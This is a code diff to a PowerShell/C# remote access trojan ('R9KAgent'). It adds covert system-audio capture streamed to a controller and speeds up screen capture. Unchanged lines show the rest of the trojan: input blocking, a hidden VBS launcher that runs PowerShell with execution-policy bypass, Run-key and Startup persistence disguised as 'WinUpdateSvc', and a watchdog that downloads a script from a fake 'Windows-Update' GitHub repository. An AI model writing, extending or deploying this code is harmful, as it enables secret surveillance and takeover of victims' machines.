@@ -69,11 +69,55 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
         [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
-        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware(); // CORREÇÃO WINDOWS 11
+        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
+
+        [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
+        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IMMDeviceEnumerator {
+            int NotImpl1();
+            int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
+        }
+        [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IMMDevice {
+            int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface);
+        }
+        [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IAudioClient {
+            int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
+            int GetBufferSize(out uint pNumBufferFrames);
+            int GetStreamLatency(out long phnsLatency);
+            int GetCurrentPadding(out uint pNumPaddingFrames);
+            int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
+            int GetMixFormat(out IntPtr ppDeviceFormat);
+            int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
+            int Start();
+            int Stop();
+            int Reset();
+            int SetEventHandle(IntPtr eventHandle);
+            int GetService(ref Guid riid, out IAudioCaptureClient ppv);
+        }
+        [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IAudioCaptureClient {
+            int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
+            int ReleaseBuffer(uint NumFramesRead);
+            int GetNextPacketSize(out uint pNumFramesInNextPacket);
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct WAVEFORMATEX {
+            public ushort wFormatTag;
+            public ushort nChannels;
+            public uint nSamplesPerSec;
+            public uint nAvgBytesPerSec;
+            public ushort nBlockAlign;
+            public ushort wBitsPerSample;
+            public ushort cbSize;
+        }
 
         static string IP;
         static int PORT;
         static bool streaming = false;
+        static bool isAudioRunning = false;
         static object writeLock = new object();
         static bool isLocked = false;
         static int targetX = 0, targetY = 0;
@@ -81,11 +125,16 @@ if (-not ("R9KAgent" -as [type])) {
         
         static Form bannerForm = null;
         static Thread bannerThread = null;
+        static StreamWriter globalWriter = null;
+
+        static Bitmap reuseBmp = null;
+        static Graphics reuseGfx = null;
+        static ImageCodecInfo jpgCodec = null;
+        static EncoderParameters jpgParams = null;
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
-            
-            try { SetProcessDPIAware(); } catch {} // Força o Windows 11 a capturar a tela corretamente
+            try { SetProcessDPIAware(); } catch {}
             
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
@@ -100,19 +149,20 @@ if (-not ("R9KAgent" -as [type])) {
                     StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                     StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                     myWriter.AutoFlush = true;
+                    globalWriter = myWriter;
 
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
 
-                    while (myClient.Connected) {
-                        Thread.Sleep(500);
-                    }
+                    while (myClient.Connected) { Thread.Sleep(500); }
                 } catch { 
                     Thread.Sleep(3000); 
                 } finally {
                     streaming = false;
+                    isAudioRunning = false;
+                    globalWriter = null;
                     try { if (myClient != null) myClient.Close(); } catch {}
                 }
             }
@@ -126,19 +176,16 @@ if (-not ("R9KAgent" -as [type])) {
             while (true) {
                 try {
                     if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
-
                     if (!File.Exists(scriptPath)) {
                         string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                         using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                         File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
-                    
                     if (!File.Exists(vbsPath)) {
                         string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
                         File.WriteAllText(vbsPath, vbs);
                         File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
-
                     string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
@@ -146,7 +193,6 @@ if (-not ("R9KAgent" -as [type])) {
                     using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                     }
-                    
                     string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                     string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                     if (!File.Exists(startupVbs)) {
@@ -199,10 +245,83 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
+        static void StartAudio() {
+            if (isAudioRunning) return;
+            isAudioRunning = true;
+            Thread t = new Thread(() => {
+                try {
+                    IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
+                    IMMDevice device;
+                    enumerator.GetDefaultAudioEndpoint(0, 1, out device); 
+                    
+                    Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
+                    IAudioClient audioClient;
+                    device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient); 
+                    
+                    IntPtr pFormat;
+                    audioClient.GetMixFormat(out pFormat);
+                    WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
+                    
+                    // 0x00080000 = AUDCLNT_STREAMFLAGS_LOOPBACK
+                    audioClient.Initialize(0, 0x00080000, 10000000, 10000000, pFormat, IntPtr.Zero); 
+                    
+                    Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
+                    IAudioCaptureClient captureClient;
+                    audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
+                    
+                    audioClient.Start();
+                    
+                    while (isAudioRunning && globalWriter != null) {
+                        Thread.Sleep(50);
+                        uint packetSize;
+                        captureClient.GetNextPacketSize(out packetSize);
+                        while (packetSize > 0 && isAudioRunning) {
+                            IntPtr pData;
+                            uint numFrames;
+                            uint flags;
+                            ulong pos, qpc;
+                            captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
+                            
+                            if (numFrames > 0) {
+                                int bytes = (int)(numFrames * wfx.nBlockAlign);
+                                byte[] buffer = new byte[bytes];
+                                Marshal.Copy(pData, buffer, 0, bytes);
+                                
+                                // Converte Float32 (WASAPI padrão) para Int16 (Player C++)
+                                if (wfx.wFormatTag == 3) { 
+                                    byte[] pcm16 = new byte[bytes / 2];
+                                    for (int i = 0; i < bytes / 4; i++) {
+                                        float f = BitConverter.ToSingle(buffer, i * 4);
+                                        short s = (short)(f * 32767.0f);
+                                        pcm16[i * 2] = (byte)(s & 0xFF);
+                                        pcm16[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
+                                    }
+                                    buffer = pcm16;
+                                }
+                                
+                                lock (writeLock) {
+                                    if (globalWriter != null) globalWriter.WriteLine("AUDIO:" + Convert.ToBase64String(buffer));
+                                }
+                            }
+                            captureClient.ReleaseBuffer(numFrames);
+                            captureClient.GetNextPacketSize(out packetSize);
+                        }
+                    }
+                    audioClient.Stop();
+                } catch {}
+            });
+            t.SetApartmentState(ApartmentState.STA); 
+            t.IsBackground = true;
+            t.Start();
+        }
+
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
+                
+                if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
+                if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
                 
                 if (cmd == "banner_on") {
                     BlockInput(true);
@@ -365,29 +484,36 @@ if (-not ("R9KAgent" -as [type])) {
         static string CaptureScreen(int maxW, long quality) {
             try {
                 Rectangle bounds = Screen.PrimaryScreen.Bounds;
-                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
-                    using (Graphics g = Graphics.FromImage(bmp)) { 
-                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size); 
+                
+                if (reuseBmp == null || reuseBmp.Width != bounds.Width || reuseBmp.Height != bounds.Height) {
+                    if (reuseGfx != null) reuseGfx.Dispose();
+                    if (reuseBmp != null) reuseBmp.Dispose();
+                    reuseBmp = new Bitmap(bounds.Width, bounds.Height);
+                    reuseGfx = Graphics.FromImage(reuseBmp);
+                }
+                
+                reuseGfx.CopyFromScreen(0, 0, 0, 0, bounds.Size);
+                
+                Bitmap finalBmp = reuseBmp;
+                if (maxW > 0 && reuseBmp.Width > maxW) {
+                    int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
+                    finalBmp = new Bitmap(newW, newH);
+                    using (Graphics g2 = Graphics.FromImage(finalBmp)) {
+                        g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
+                        g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                     }
-                    Bitmap finalBmp = bmp;
-                    if (maxW > 0 && bmp.Width > maxW) {
-                        int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
-                        finalBmp = new Bitmap(newW, newH);
-                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
-                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
-                            g2.DrawImage(bmp, 0, 0, newW, newH);
-                        }
-                    }
-                    using (MemoryStream ms = new MemoryStream()) {
-                        EncoderParameters ep = new EncoderParameters(1);
-                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
+                }
+                
+                using (MemoryStream ms = new MemoryStream()) {
+                    if (jpgCodec == null) {
                         ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
-                        ImageCodecInfo codec = null;
-                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { codec = c; break; } }
-                        finalBmp.Save(ms, codec, ep);
-                        if (finalBmp != bmp) finalBmp.Dispose();
-                        return Convert.ToBase64String(ms.ToArray());
+                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
+                        jpgParams = new EncoderParameters(1);
+                        jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                     }
+                    finalBmp.Save(ms, jpgCodec, jpgParams);
+                    if (finalBmp != reuseBmp) finalBmp.Dispose();
+                    return Convert.ToBase64String(ms.ToArray());
                 }
             } catch { return null; }
         }
